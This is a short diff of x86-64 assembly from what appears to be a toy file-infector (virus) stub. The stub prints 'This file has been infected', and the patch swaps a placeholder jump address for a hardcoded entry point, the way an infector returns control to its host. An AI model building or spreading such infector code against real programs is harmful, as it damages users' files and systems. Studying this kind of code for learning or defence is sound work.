@@ -9,9 +9,8 @@ _start:
 	syscall
 
 	xor		rdx, rdx
-	mov		rax, [rel addr]
+	mov		rax, 0x580
 	jmp		rax
 
 msg:		db 'This file has been infected', 10, 0
 msg_end:	db 0x0
-addr:		dq 0x2222222222222222
